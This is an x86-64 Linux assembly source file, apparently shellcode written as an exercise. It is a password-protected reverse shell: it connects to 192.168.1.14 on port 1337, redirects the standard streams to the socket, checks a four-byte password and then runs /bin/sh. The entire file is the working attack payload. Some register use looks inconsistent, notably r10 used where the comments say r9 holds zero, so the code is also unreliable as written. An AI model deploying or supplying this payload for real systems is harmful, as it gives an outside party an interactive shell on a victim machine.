global _start
section .text 


_start: 
	jmp real_start
	pass: db 'LOLD', 0x4	



real_start:

	IP equ 0x0e01a8c0 ; 192.168.1.14
	PORT equ 0x3905   ; 1337


	xor rax, rax 
	xor rdi, rdi 
	xor rsi, rsi
	xor rdx, rdx 
	xor r9, r9 ; we keep a register alway set to zero 
;socket(2,1,0);

	push 41
	pop rax ; prepare RAX for calling socket
	
	push 2 
	pop rdi ; rdi points to AF_INET 
	push 1
	pop rsi ; SOCK_STREAM
	; rdx is already set to zero 
	syscall 

	xchg rdi, rax ; RDI contains socket file descriptor


;preparing sockaddr_in structure and call to connect
;connect(sockfd, (struct sockaddr *)  &st, sizeof(st));


	push r9 ; r9 is zeroed at the beginning 
	mov byte [rsp], 0x2 ; sin_family 
	mov  word [rsp+0x2], PORT ; sin_port
	mov dword [rsp+0x4], IP ; sin_addr.s_addr
	
	;rdi already set to socket fd 
	push rsp 
	pop rsi  ; rsi = (struct sockaddr *) 
	push 16
	pop rdx ; sizeof(struct)
	push 0x2a
	pop rax 
	syscall

; dup2

	push 3
	pop rsi

loop_dup2:
	push 33 ; dup2
	pop rax
	dec esi
	syscall
	loopnz loop_dup2 

;read(fd, input, 4)

        mov rax, r9
	push rax ; push 0 , 0 is also read syscall 
	pop rdi ; rdi points to 0 , stdin

	push rax ; push 0 again 
	mov rsi, rsp ; rsi points to an empty buffer
	push 0x4 ; size of the bytes to read
	pop rdx ; rdx = 4 
	
	syscall

;check password 
	mov eax, [rel pass]
	mov rdi,  rsp
	scasd 
	jne exit

;execve("/bin/sh", NULL, NULL);
        mov rax, r10
        push rax ; push zero 
        mov rbx, 0x68732f2f6e69622f ;shell string
        push rbx
        mov rdi, rsp ; prepare args 
        push rax
        mov rdx, rsp
        push rdi
        mov rsi, rsp
        push 59 ; 59 is execve syscall 
	pop rax 
        syscall


exit:
	push 60 ; gracefull exit 
	pop rax 
	syscall


